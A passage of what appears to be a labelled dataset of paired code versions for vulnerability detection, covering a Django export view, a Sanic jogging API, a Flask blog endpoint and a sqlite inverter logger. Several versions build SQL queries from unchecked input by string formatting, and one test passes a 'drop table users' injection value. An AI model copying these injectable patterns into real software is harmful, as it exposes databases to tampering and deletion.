False / No\n        4. Customer response received is not from this financial year\n        Note that this view removes win, notification and customer response entries\n        that might have been made inactive in duecourse\n        \"\"\"\n        sql_str = \"SELECT id FROM wins_completed_wins_fy\"\n        if self.end_date:\n            sql_str = f\"{sql_str} where created <= '{self.end_date.strftime('%m-%d-%Y')}'\"\n\n        with connection.cursor() as cursor:\n            cursor.execute(sql_str)\n            ids = cursor.fetchall()\n\n        wins = Win.objects.filter(id__in=[id[0] for id in ids]).values()\n\n        for win in wins:\n            yield self._get_win_data(win)\n\n    def get(self, request, format=None):\n        end_str = request.GET.get(\"end\", None)\n        if end_str:\n            try:\n                self.end_date = models.DateField().to_python(end_str)\n            except ValidationError:\n                self.end_date = None\n\n        return self.streaming_response(f'wins_current_fy_{now().isoformat()}.csv')\n/n/n/n", "label": 1}, {"id": "6479565faf37bc48eed36fed46f7e8ee377f1d1e", "code": "Models/jogging_result.py/n/nimport json\nfrom sqlalchemy.sql import text\nfrom sqlalchemy.exc import OperationalError\nfrom .dbhelper import engine\n\n\nclass JoggingResult(object):\n    def __init__(\n        self, user_id, location, date, distance, time, condition\n    ):\n        self.user_id = user_id\n        self.location = location\n        self.date = date\n        self.distance = distance\n        self.time = time\n        self.condition = condition\n\n    def __dict__(self):\n        return {\n            \"location\": self.location,\n            \"date\": self.date,\n            \"distance\": self.distance,\n            \"time\": self.time,\n            \"condition\": json.loads(self.condition),\n        }\n\n    def save(self):\n        connection = engine.connect()\n        trans = connection.begin()\n        try:\n            s = text(\n                \"INSERT INTO jogging_results(user_id, location, date, running_distance, time, condition) \"\n                \"VALUES(:user_id, :location, :date, :running_distance, :time, :condition)\"\n            )\n            connection.execute(\n                s,\n                user_id=self.user_id,\n                location=self.location,\n                date=self.date,\n                running_distance=self.distance,\n                time=self.time,\n                condition=self.condition,\n            )\n            trans.commit()\n        except:\n            trans.rollback()\n            raise\n        connection.close()\n\n    @classmethod\n    def load(\n        cls, user_id: int, q_filter: str, page: int, limit: int\n    ) -> list:\n        assert engine\n        s = (\n            \"SELECT location, date, running_distance, time, condition \"\n            \"FROM jogging_results \"\n            \"WHERE user_id = :user_id\"\n        )\n\n        if q_filter:\n            q_filter = (\n                q_filter.replace(\"eq\", \"=\")\n                .replace(\"ne\", \"!=\")\n                .replace(\"gt\", \">=\")\n                .replace(\"lt\", \"<=\")\n                .replace(\"distance\", \"running_distance\")\n                .replace(\";\", \"\")\n            )\n            s += f\" AND ({q_filter})\"\n\n        s += \" ORDER BY date(date) LIMIT :limit OFFSET :page\"\n\n        connection = engine.connect()\n        try:\n            q_result = connection.execute(\n                text(s), user_id=user_id, limit=limit, page=page\n            ).fetchall()\n        except OperationalError as e:\n            raise (e)\n\n        rc = (\n            [\n                JoggingResult(\n                    user_id, row[0], row[1], row[2], row[3], row[4]\n                ).__dict__()\n                for row in q_result\n            ]\n            if q_result is not None\n            else []\n        )\n        connection.close()\n        return rc\n/n/n/nModels/user.py/n/nfrom sqlalchemy.sql import text\nfrom .dbhelper import engine\n\n\nclass User(object):\n    def __init__(\n        self,\n        user_id,\n        username,\n        hashed_password,\n        roll_id=1,\n        *args,\n        **kwargs\n    ):\n        self.user_id = user_id\n        self.username = username\n        self.hashed_password = hashed_password\n        self.roll_id = roll_id\n\n    def to_dict(self):\n        return {\"user_id\": self.user_id, \"username\": self.username}\n\n    def save(self):\n        connection = engine.connect()\n        trans = connection.begin()\n        try:\n            s = text(\n                \"INSERT INTO users(username, hashed_password, roll_id) \"\n                \"VALUES(:username, :hashed_password, :roll_id)\"\n            )\n            connection.execute(\n                s,\n                username=self.username,\n                hashed_password=self.hashed_password,\n                roll_id=self.roll_id,\n            )\n            trans.commit()\n        except:\n            trans.rollback()\n            raise\n        connection.close()\n\n    @classmethod\n    def get_by_username(cls, username):\n        assert engine\n        s = text(\n            \"SELECT user_id, username, hashed_password, roll_id \"\n            \"FROM users \"\n            \"WHERE username = :username AND expire_date is null\"\n        )\n        connection = engine.connect()\n        rc = connection.execute(s, username=username).fetchone()\n        if rc is not None:\n            rc = User(rc[0], rc[1], rc[2].decode(\"utf-8\"), rc[3])\n\n        connection.close()\n        return rc\n\n    @classmethod\n    def username_exists(cls, username):\n        assert engine\n        s = text(\n            \"SELECT * \"\n            \"FROM users \"\n            \"WHERE username = :username AND expire_date is null\"\n        )\n        connection = engine.connect()\n\n        rc = (\n            False\n            if connection.execute(s, username=username).fetchone()\n            is None\n            else True\n        )\n        connection.close()\n        return rc\n/n/n/nRoutes/jogging_results.py/n/nimport datetime\nimport json\nfrom sanic import response\nfrom sanic.exceptions import SanicException, InvalidUsage, add_status_code\nfrom sanic_jwt.decorators import protected\nfrom jogging.Contectors.darksky import get_weather_condition\nfrom jogging.Routes.auth import retrieve_user\nfrom jogging.Models.jogging_result import JoggingResult\n\n\n@add_status_code(409)\nclass Conflict(SanicException):\n    pass\n\n\n@protected()\nasync def add_jogging_result(request, *args, **kwargs):\n    if (\n        request.json is None\n        or \"date\" not in request.json\n        or \"distance\" not in request.json\n        or \"time\" not in request.json\n        or \"location\" not in request.json\n    ):\n        raise InvalidUsage(\n            \"invalid payload (should be {date, distance, time, location})\"\n        )\n\n    distance = request.json[\"distance\"]\n    if distance <= 0:\n        raise InvalidUsage(\"distance needs to be positive\")\n\n    try:\n        date = datetime.datetime.strptime(\n            request.json[\"date\"], \"%Y-%m-%d\"\n        ).date()\n    except ValueError:\n        raise InvalidUsage(\"invalid date (should be 'YYYY-MM-DD')\")\n\n    latlong = request.json[\"location\"].split(\" \")\n\n    if len(latlong) != 2:\n        raise InvalidUsage(\"invalid location (should be 'LAT LONG')\")\n\n    try:\n        lat = float(latlong[0])\n        long = float(latlong[1])\n    except ValueError:\n        raise InvalidUsage(\n            \"invalid location (lat & long should be floating-point)\"\n        )\n\n    if not (-90.0 <= lat <= 90.0 and -180 <= long <= 180):\n        raise InvalidUsage(\n            \"invalid location (The latitude must be a number between -90 and 90 and the longitude between -180 and 180)\"\n        )\n\n    try:\n        time = int(request.json[\"time\"])\n    except ValueError:\n        raise InvalidUsage(\"invalid time (time should be an integer)\")\n\n    if time <= 0:\n        raise InvalidUsage(\"invalid time (time should be positive)\")\n\n    condition = await get_weather_condition(lat, long, date)\n\n    if condition is None:\n        raise InvalidUsage(\n            \"can't fetch running conditions for that location & time\"\n        )\n\n    user_id = retrieve_user(request, args, kwargs)[\"user_id\"]\n\n    jog = JoggingResult(\n        user_id,\n        request.json[\"location\"],\n        date,\n        distance,\n        time,\n        json.dumps(condition[\"data\"][0]),\n    )\n    jog.save()\n\n    return response.HTTPResponse(status=201)\n\n\n@protected()\nasync def get_jogging_results(request, *args, **kwargs):\n    page = int(request.args[\"page\"][0]) if \"page\" in request.args else 0\n    limit = int(request.args[\"count\"][0]) if \"count\" in request.args else 10\n\n    if page < 0 or limit <= 0:\n        raise InvalidUsage(\"invalid paging (page >= 0 and count > 0)\")\n\n    q_filter = request.args[\"filter\"][0] if \"filter\" in request.args else None\n    user_id = retrieve_user(request, args, kwargs)[\"user_id\"]\n\n    try:\n        rc = JoggingResult.load(user_id, q_filter, page, limit)\n    except Exception as e:\n        raise InvalidUsage(e)\n\n    return response.json(rc, status=200)\n/n/n/nTests/test_jogging_results.py/n/nimport pytest\nfrom sanic import Sanic\nimport random\nimport json\nfrom jogging.main import config_app\nfrom jogging import config\nfrom jogging.Models.user import User\n\nusername = None\naccess_token = None\nrefresh_token = None\n\n\n@pytest.yield_fixture\ndef app():\n    config.app = Sanic(\"test_sanic_app\")\n    config_app()\n    yield config.app\n\n\n@pytest.fixture\ndef test_cli(loop, app, sanic_client):\n\n    global username\n    while username is None:\n        i = random.randint(1, 10000)\n        username = f\"amichay.oren+{i}@gmail.com\"\n        if User.username_exists(username):\n            username = None\n\n    return loop.run_until_complete(sanic_client(app))\n\n\nasync def test_positive_register_(test_cli):\n    data = {\"username\": username, \"password\": \"testing123G\"}\n    resp = await test_cli.post(\"/users\", data=json.dumps(data))\n    assert resp.status == 201\n\n\nasync def test_positive_login(test_cli):\n    data = {\"username\": username, \"password\": \"testing123G\"}\n    resp = await test_cli.post(\"/auth\", data=json.dumps(data))\n    resp_json = await resp.json()\n    print(resp_json)\n    global access_token\n    access_token = resp_json[\"access_token\"]\n    global refresh_token\n    refresh_token = resp_json[\"refresh_token\"]\n    assert access_token is not None\n    assert refresh_token is not None\n    assert resp.status == 200\n\n\nasync def test_negative_jogging_result(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n    data = {\n        \"date\": \"1971-06-20\",\n        \"distance\": 2000,\n        \"time\": 405,\n        \"location\": \"32.0853 34.7818\",\n    }\n    resp = await test_cli.post(\n        \"/results\", headers=headers, data=json.dumps(data)\n    )\n    assert resp.status == 400\n\n\nasync def test_positive_jogging_result(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n    data = {\n        \"date\": \"2015-06-20\",\n        \"distance\": 2000,\n        \"time\": 405,\n        \"location\": \"32.0853 34.7818\",\n    }\n    resp = await test_cli.post(\n        \"/results\", headers=headers, data=json.dumps(data)\n    )\n    assert resp.status == 201\n\n\nasync def test_positive_load_dataset(test_cli):\n    import csv\n\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    dsreader = csv.reader(open(\"jogging_dataset.csv\"), delimiter=\",\")\n    for row in dsreader:\n        data = {\n            \"date\": row[0],\n            \"location\": row[1],\n            \"distance\": int(row[2]),\n            \"time\": int(row[3]),\n        }\n        resp = await test_cli.post(\n            \"/results\", headers=headers, data=json.dumps(data)\n        )\n        assert resp.status == 201\n\n\nasync def test_negative_jogging_result_no_uath(test_cli):\n    global access_token\n    global refresh_token\n    data = {\n        \"date\": \"2015-06-20\",\n        \"distance\": 2000,\n        \"time\": 405,\n        \"location\": \"32.0853 34.7818\",\n    }\n    resp = await test_cli.post(\"/results\", data=json.dumps(data))\n    assert resp.status == 400\n\n\nasync def test_positive_get_all_results(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\"/results\", headers=headers)\n    resp_json = await resp.json()\n\n    assert resp.status == 200\n\n\nasync def test_positive_get_paging(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\n        \"/results?page=0&count=2\", headers=headers\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 2\n\n    resp = await test_cli.get(\n        \"/results?page=1&count=1\", headers=headers\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 1\n\n\nasync def test_negative_bad_paging(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\n        \"/results?page=-1&count=2\", headers=headers\n    )\n    assert resp.status == 400\n\n    resp = await test_cli.get(\n        \"/results?page=1&count=0\", headers=headers\n    )\n    assert resp.status == 400\n\n\nasync def test_negative_sql_injection(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\n        \"/results?page=0&count=2&filter=%3Bdrop table users%3B\",\n        headers=headers,\n    )\n    assert resp.status == 400\n\n\nasync def test_positive_check_filters(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\n        \"/results?page=0&count=2&filter=date eq '2019-07-15'\",\n        headers=headers,\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 1\n\n    resp = await test_cli.get(\n        \"/results?filter=(date lt '2018-01-01') AND (time lt 500)\",\n        headers=headers,\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 4\n\n    resp = await test_cli.get(\n        \"/results?filter=distance ne 2000\", headers=headers\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 8\n\n    resp = await test_cli.get(\n        \"/results?filter=distance ne 2000 and ((time lt 400) and (time gt 390))\",\n        headers=headers,\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 0\n/n/n/n", "label": 0}, {"id": "6479565faf37bc48eed36fed46f7e8ee377f1d1e", "code": "/Models/user.py/n/nfrom sqlalchemy.sql import text\nfrom .dbhelper import engine\n\n\nclass User(object):\n    def __init__(\n        self, user_id, username, hashed_password, roll_id=1, *args, **kwargs\n    ):\n        self.user_id = user_id\n        self.username = username\n        self.hashed_password = hashed_password\n        self.roll_id = roll_id\n\n    def to_dict(self):\n        return {\"user_id\": self.user_id, \"username\": self.username}\n\n    def save(self):\n        connection = engine.connect()\n        trans = connection.begin()\n        try:\n            s = text(\n                \"INSERT INTO users(username, hashed_password, roll_id) \"\n                \"VALUES(:username, :hashed_password, :roll_id)\"\n            )\n            connection.execute(\n                s,\n                username=self.username,\n                hashed_password=self.hashed_password,\n                roll_id=self.roll_id,\n            )\n            trans.commit()\n        except:\n            trans.rollback()\n            raise\n        connection.close()\n\n    @classmethod\n    def get_by_username(cls, username):\n        assert engine\n        s = text(\n            \"SELECT user_id, username, hashed_password, roll_id \"\n            \"FROM users \"\n            \"WHERE username = :username AND expire_date is null\"\n        )\n        connection = engine.connect()\n        rc = connection.execute(s, username=username).fetchone()\n        if rc is not None:\n            rc = User(rc[0], rc[1], rc[2].decode(\"utf-8\"), rc[3])\n\n        connection.close()\n        return rc\n\n    @classmethod\n    def username_exists(cls, username):\n        assert engine\n        s = text(\n            \"SELECT * \"\n            \"FROM users \"\n            \"WHERE username = :username AND expire_date is null\"\n        )\n        connection = engine.connect()\n\n        rc = (\n            False\n            if connection.execute(s, username=username).fetchone() is None\n            else True\n        )\n        connection.close()\n        return rc\n/n/n/n/Routes/jogging_results.py/n/nimport datetime\nimport json\nfrom sanic import response\nfrom sanic.exceptions import SanicException, InvalidUsage, add_status_code\nfrom sanic_jwt.decorators import protected\nfrom jogging.Contectors.darksky import get_weather_condition\nfrom jogging.Routes.auth import retrieve_user\nfrom jogging.Models.jogging_result import JoggingResult\n\n\n@add_status_code(409)\nclass Conflict(SanicException):\n    pass\n\n\n@protected()\nasync def add_jogging_result(request, *args, **kwargs):\n    if (\n        request.json is None\n        or \"date\" not in request.json\n        or \"distance\" not in request.json\n        or \"time\" not in request.json\n        or \"location\" not in request.json\n    ):\n        raise InvalidUsage(\n            \"invalid payload (should be {date, distance, time, location})\"\n        )\n\n    distance = request.json[\"distance\"]\n    if distance <= 0:\n        raise InvalidUsage(\"distance needs to be positive\")\n\n    try:\n        date = datetime.datetime.strptime(\n            request.json[\"date\"], \"%Y-%m-%d\"\n        ).date()\n    except ValueError:\n        raise InvalidUsage(\"invalid date (should be 'YYYY-MM-DD')\")\n\n    latlong = request.json[\"location\"].split(\" \")\n\n    if len(latlong) != 2:\n        raise InvalidUsage(\"invalid location (should be 'LAT LONG')\")\n\n    try:\n        lat = float(latlong[0])\n        long = float(latlong[1])\n    except ValueError:\n        raise InvalidUsage(\n            \"invalid location (lat & long should be floating-point)\"\n        )\n\n    if not (-90.0 <= lat <= 90.0 and -180 <= long <= 180):\n        raise InvalidUsage(\n            \"invalid location (The latitude must be a number between -90 and 90 and the longitude between -180 and 180)\"\n        )\n\n    try:\n        time = int(request.json[\"time\"])\n    except ValueError:\n        raise InvalidUsage(\"invalid time (time should be an integer)\")\n\n    if time <= 0:\n        raise InvalidUsage(\"invalid time (time should be positive)\")\n\n    condition = await get_weather_condition(lat, long, date)\n\n    if condition is None:\n        raise InvalidUsage(\n            \"can't fetch running conditions for that location & time\"\n        )\n\n    user_id = retrieve_user(request, args, kwargs)[\"user_id\"]\n\n    jog = JoggingResult(\n        user_id,\n        request.json[\"location\"],\n        date,\n        distance,\n        time,\n        json.dumps(condition[\"data\"][0]),\n    )\n    jog.save()\n\n    return response.HTTPResponse(status=201)\n\n\n@protected()\nasync def get_jogging_results(request, *args, **kwargs):\n    page = int(request.args[\"page\"][0]) if \"page\" in request.args else 0\n    limit = int(request.args[\"count\"][0]) if \"count\" in request.args else 10\n\n    if page < 0 or limit <= 0:\n        raise InvalidUsage(\"invalid paging (page >= 0 and count > 0)\")\n\n    q_filter = request.args[\"filter\"][0] if \"filter\" in request.args else None\n    user_id = retrieve_user(request, args, kwargs)[\"user_id\"]\n\n    return response.json(\n        JoggingResult.load(user_id, q_filter, page, limit), status=200\n    )\n/n/n/n/Tests/test_jogging_results.py/n/nimport pytest\nfrom sanic import Sanic\nimport random\nimport json\nfrom jogging.main import config_app\nfrom jogging import config\nfrom jogging.Models.user import User\n\nusername = None\naccess_token = None\nrefresh_token = None\n\n\n@pytest.yield_fixture\ndef app():\n    config.app = Sanic(\"test_sanic_app\")\n    config_app()\n    yield config.app\n\n\n@pytest.fixture\ndef test_cli(loop, app, sanic_client):\n\n    global username\n    while username is None:\n        i = random.randint(1, 10000)\n        username = f\"amichay.oren+{i}@gmail.com\"\n        if User.username_exists(username):\n            username = None\n\n    return loop.run_until_complete(sanic_client(app))\n\n\nasync def test_positive_register_(test_cli):\n    data = {\"username\": username, \"password\": \"testing123G\"}\n    resp = await test_cli.post(\"/users\", data=json.dumps(data))\n    assert resp.status == 201\n\n\nasync def test_positive_login(test_cli):\n    data = {\"username\": username, \"password\": \"testing123G\"}\n    resp = await test_cli.post(\"/auth\", data=json.dumps(data))\n    resp_json = await resp.json()\n    print(resp_json)\n    global access_token\n    access_token = resp_json[\"access_token\"]\n    global refresh_token\n    refresh_token = resp_json[\"refresh_token\"]\n    assert access_token is not None\n    assert refresh_token is not None\n    assert resp.status == 200\n\n\nasync def test_negative_jogging_result(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n    data = {\n        \"date\": \"1971-06-20\",\n        \"distance\": 2000,\n        \"time\": 405,\n        \"location\": \"32.0853 34.7818\",\n    }\n    resp = await test_cli.post(\n        \"/results\", headers=headers, data=json.dumps(data)\n    )\n    assert resp.status == 400\n\n\nasync def test_positive_jogging_result(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n    data = {\n        \"date\": \"2015-06-20\",\n        \"distance\": 2000,\n        \"time\": 405,\n        \"location\": \"32.0853 34.7818\",\n    }\n    resp = await test_cli.post(\n        \"/results\", headers=headers, data=json.dumps(data)\n    )\n    assert resp.status == 201\n\n\nasync def test_positive_load_dataset(test_cli):\n    import csv\n\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    dsreader = csv.reader(open(\"jogging_dataset.csv\"), delimiter=\",\")\n    for row in dsreader:\n        data = {\n            \"date\": row[0],\n            \"location\": row[1],\n            \"distance\": int(row[2]),\n            \"time\": int(row[3]),\n        }\n        resp = await test_cli.post(\n            \"/results\", headers=headers, data=json.dumps(data)\n        )\n        assert resp.status == 201\n\n\nasync def test_negative_jogging_result_no_uath(test_cli):\n    global access_token\n    global refresh_token\n    data = {\n        \"date\": \"2015-06-20\",\n        \"distance\": 2000,\n        \"time\": 405,\n        \"location\": \"32.0853 34.7818\",\n    }\n    resp = await test_cli.post(\"/results\", data=json.dumps(data))\n    assert resp.status == 400\n\n\nasync def test_positive_get_all_results(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\"/results\", headers=headers)\n    resp_json = await resp.json()\n\n    assert resp.status == 200\n\n\nasync def test_positive_get_paging(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\"/results?page=0&count=2\", headers=headers)\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 2\n\n    resp = await test_cli.get(\"/results?page=1&count=1\", headers=headers)\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 1\n\n\nasync def test_negative_bad_paging(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\"/results?page=-1&count=2\", headers=headers)\n    assert resp.status == 400\n\n    resp = await test_cli.get(\"/results?page=1&count=0\", headers=headers)\n    assert resp.status == 400\n\n\nasync def test_positive_check_filters(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\n        \"/results?page=0&count=2&filter=date eq '2019-07-15'\", headers=headers\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 1\n\n    resp = await test_cli.get(\n        \"/results?filter=(date lt '2018-01-01') AND (time lt 500)\",\n        headers=headers,\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 4\n\n    resp = await test_cli.get(\n        \"/results?filter=distance ne 2000\", headers=headers\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 8\n\n    resp = await test_cli.get(\n        \"/results?filter=distance ne 2000 and ((time lt 400) and (time gt 390))\",\n        headers=headers,\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 0\n/n/n/n", "label": 1}, {"id": "35f3d2a1ffde10d3a9055572478e46b9e8d132e9", "code": "rest.py/n/nfrom flask import Flask\r\nfrom flask_restful import Api, Resource, reqparse\r\nfrom WebHandler import getHTML\r\nimport re\r\n\r\napp = Flask(__name__)\r\napi = Api(app)\r\n\r\n# Blog REST API\r\nclass Blog(Resource):\r\n\r\n    #GET Request- Returns website in full html\r\n    def get(self, name):\r\n        # Hoping this stops SQL injection\r\n        if re.match(\"^[A-Za-z0-9_-]*$\", name):\r\n            return getHTML(name)\r\n        else:\r\n            return \"RAWR XD\"\r\n        \r\n    #def post(self, name):\r\n    #def put(self, name):\r\n    #def delete(self, name):\r\n\r\n# Access the api from 198.58.107.98:6969/blog/url-name\r\napi.add_resource(Blog, \"/blog/<string:name>\")\r\n\r\napp.run(host='198.58.107.98', port=6969, debug=True)/n/n/n", "label": 0}, {"id": "35f3d2a1ffde10d3a9055572478e46b9e8d132e9", "code": "/rest.py/n/nfrom flask import Flask\r\nfrom flask_restful import Api, Resource, reqparse\r\nfrom WebHandler import getHTML\r\n\r\napp = Flask(__name__)\r\napi = Api(app)\r\n\r\n# Blog REST API\r\nclass Blog(Resource):\r\n\r\n    #GET Request- Returns website in full html\r\n    def get(self, name):\r\n        return getHTML(name)\r\n        \r\n    #def post(self, name):\r\n    #def put(self, name):\r\n    #def delete(self, name):\r\n\r\n# Access the api from 198.58.107.98:6969/blog/url-name\r\napi.add_resource(Blog, \"/blog/<string:name>\")\r\n\r\napp.run(host='198.58.107.98', port=6969, debug=True)/n/n/n", "label": 1}, {"id": "269b48caa05377b7c58c3e6d1622a4429cb5ba65", "code": "util/database.py/n/n#!/usr/bin/python3\n\"\"\"\n\"\"\"\nimport sqlite3, pytz\nfrom datetime import datetime, timedelta\n\n\nclass Database():\n\n    def __init__(self, config):\n        self.config = config\n        self.db = sqlite3.connect(self.config.get_database_path(), check_same_thread=False)\n        self.c = self.db.cursor()\n\n    def add_inverters(self):\n        interfaces = self.config.get_connection_interfaces()\n        for source in interfaces:\n            if source[\"type\"] == \"inverter\":\n\n                query = '''\n                    INSERT OR IGNORE INTO Inverters (\n                        Serial,\n                        EToday,\n                        ETotal\n                    ) VALUES (\n                        ?,\n                        ?,\n                        ?\n                    );\n                '''\n                self.c.execute(query, (source[\"serial_id\"], 0, source[\"prev_etotal\"]))\n\n                query = '''\n                    UPDATE Inverters\n                    SET     \n                        Name=?, \n                        Type=?, \n                        SW_Version=?, \n                        Status=?,\n                        TimeStamp=?\n                    WHERE Serial=?;\n                '''\n                self.c.execute(query, (source[\"name\"], source[\"inverter_type\"], \"s0-bridge v0\", \"OK\", int(datetime.now().timestamp()), source[\"serial_id\"] ))\n\n                self.db.commit()\n\n    def add_data(self, ts, data_points):\n        for data in data_points:\n\n            data_type = data['source']['type']\n\n            if data_type == 'inverter':\n\n                self.add_inverter_data(ts, data)\n\n            elif data_type == 'consumption':\n\n                self.add_consumption_data_row(ts, data['energy'], data['power'])\n\n    def add_inverter_data(self, ts, data):\n\n        inv_serial = data['source']['serial_id']\n        prev_ts, prev_etoday, prev_etotal = self.get_previous_yields(inv_serial)\n\n        status = 'OK'  # TODO: Generate actual status value\n\n        self.add_day_data_row(ts, data, prev_etotal)\n\n        if self.is_timestamps_from_same_day(prev_ts, ts):\n\n            self.update_inverter(inv_serial, ts, status, prev_etoday + data['energy'],  prev_etotal + data['energy'])\n\n        else:   # is new day\n\n            self.update_inverter(inv_serial, ts, status, data['energy'],  prev_etotal + data['energy'])\n            self.add_month_data_row(inv_serial, ts, prev_etoday, prev_etotal)\n\n        self.db.commit()\n\n    def add_day_data_row(self, ts, data, prev_etotal):\n\n        if data['power'] > 0:\n\n            inv_serial = data['source']['serial_id']\n            query = '''\n               INSERT INTO DayData (\n                   TimeStamp,\n                   Serial,\n                   Power,\n                   TotalYield\n               ) VALUES (\n                   ?,\n                   ?,\n                   ?,\n                   ?\n               );\n            '''\n            self.c.execute(query, (ts, inv_serial, data['power'],  prev_etotal + data['energy']))\n\n\n    def get_previous_yields(self, inverter_serial):\n        query = '''\n           SELECT TimeStamp, EToday, ETotal\n           FROM Inverters\n           WHERE Serial=?\n        '''\n        self.c.execute(query, (inverter_serial,))\n        data = self.c.fetchone()\n        return data[0], data[1], data[2]\n\n    def update_inverter(self, inverter_serial, ts, status, etoday, etotal):\n        query = '''\n            UPDATE Inverters\n            SET     \n                TimeStamp=?, \n                Status=?, \n                eToday=?,\n                eTotal=?\n            WHERE Serial=?;\n        '''\n        self.c.execute(query, (ts, status, etoday, etotal, inverter_serial))\n\n    def add_month_data_row(self, inverter_serial, ts, etoday, etotal):\n\n        y = datetime.fromtimestamp(ts) - timedelta(days=1)\n        y_ts = int(datetime(y.year, y.month, y.day, 23, tzinfo=pytz.utc).timestamp())\n\n        query = '''\n            INSERT INTO MonthData (\n                TimeStamp,\n                Serial,\n                DayYield,\n                TotalYield                                 \n            ) VALUES (\n                ?,\n                ?,\n                ?,\n                ?\n            );\n        '''\n        self.c.execute(query, (y_ts, inverter_serial, etoday, etotal))\n\n    def add_consumption_data_row(self, ts, energy_used, power_used):\n\n        if power_used > 0:\n\n            query = '''\n                INSERT OR IGNORE INTO Consumption (\n                    TimeStamp,\n                    EnergyUsed,\n                    PowerUsed                                \n                ) VALUES (\n                    ?,\n                    ?,\n                    ?\n                );\n            '''\n            self.c.execute(query, (ts, 0, 0))\n\n            query = '''\n                UPDATE Consumption SET \n                EnergyUsed = EnergyUsed + ?,\n                PowerUsed = PowerUsed + ?\n                WHERE TimeStamp=?;\n            '''\n\n            self.c.execute(query, (energy_used, power_used, ts))\n\n            self.db.commit()\n\n\n    def is_timestamps_from_same_day(self, ts1, ts2):\n        d1 = datetime.fromtimestamp(ts1)\n        d2 = datetime.fromtimestamp(ts2)\n        return (d1.year == d2.year and d1.month == d2.month and d1.day == d2.day)\n\n    def close(self):\n        self.db.close()\n\nif __name__ == '__main__':\n    #print('nothing to do here')\n\n    import random, time\n    from config import Config\n\n    cfg = Config(config_path='../config.json')\n    db  = Database(cfg)\n\n    db.add_inverters()\n\n    test_ts = 1535932800\n\n    print(test_ts)\n\n    while True:\n\n        test_ts += 300\n        test_date = datetime.fromtimestamp(test_ts)\n\n        if test_date.hour in range(0, 8) or test_date.hour in range(18, 24): continue\n\n        watts = random.randint(50, 400)\n        test_data = [\n            {\n                'energy': int(watts),\n                'power': int(watts / 5*60),\n                'source': {\n                    \"serial_id\": \"1000000001\",\n                    \"name\": \"TEST PLANT\",\n                    \"type\": \"inverter\",\n                    \"prev_etotal\": 62,\n                    \"pulses_per_kwh\": 1000\n                }\n            },\n            {\n                'energy': int(watts),\n                'power': int(watts / 5 * 60),\n                'source': {\n                    \"serial_id\": \"1000000002\",\n                    \"name\": \"TEST CONSUMPTION COUNTER\",\n                    \"type\": \"consumption\"\n                }\n            }\n        ]\n\n        db.add_data(test_ts, test_data)\n        print(test_date.strftime(\"%y-%m-%d %H:%M:%S\"), '\\t', test_ts, '\\t', test_data[0]['energy'], '\\t', test_data[0]['power'])\n\n        time.sleep(0.1)\n\n\n\n\n\n/n/n/n", "label": 0}, {"id": "269b48caa05377b7c58c3e6d1622a4429cb5ba65", "code": "/util/database.py/n/n#!/usr/bin/python3\n\"\"\"\n\"\"\"\nimport sqlite3, pytz\nfrom datetime import datetime, timedelta\n\n\nclass Database():\n\n    def __init__(self, config):\n        self.config = config\n        self.db = sqlite3.connect(self.config.get_database_path(), check_same_thread=False)\n        self.c = self.db.cursor()\n\n    def add_inverters(self):\n        interfaces = self.config.get_connection_interfaces()\n        for source in interfaces:\n            if source[\"type\"] == \"inverter\":\n\n                query = '''\n                    INSERT OR IGNORE INTO Inverters (\n                        Serial,\n                        EToday,\n                        ETotal\n                    ) VALUES (\n                        %s,\n                        %s,\n                        %s\n                    );\n                ''' % (source[\"serial_id\"], 0, source[\"prev_etotal\"])\n                self.c.execute(query)\n\n                query = '''\n                    UPDATE Inverters\n                    SET     \n                        Name='%s', \n                        Type='%s', \n                        SW_Version='%s', \n                        Status='%s',\n                        TimeStamp='%s'\n                    WHERE Serial='%s';\n                ''' % (source[\"name\"], source[\"inverter_type\"], \"s0-bridge v0\", \"OK\", int(datetime.now().timestamp()), source[\"serial_id\"] )\n                self.c.execute(query)\n\n                self.db.commit()\n\n    def add_data(self, ts, data_points):\n        for data in data_points:\n\n            data_type = data['source']['type']\n\n            if data_type == 